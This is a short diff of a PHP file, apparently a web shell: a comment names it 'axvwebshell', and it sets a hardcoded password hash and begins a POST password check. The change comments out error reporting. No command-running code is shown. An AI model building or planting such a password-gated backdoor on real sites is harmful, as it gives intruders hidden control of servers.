@@ -1,8 +1,8 @@
 <?php
 
-ini_set('display_errors', '1');
-ini_set('display_startup_errors', '1');
-error_reporting(E_ALL);
+//ini_set('display_errors', '1');
+//ini_set('display_startup_errors', '1');
+//error_reporting(E_ALL);
 
 $password = "052a754db43105aafde93bb1dbdc2bb1"; //axvwebshell
 if(isset($_POST['password'])) {
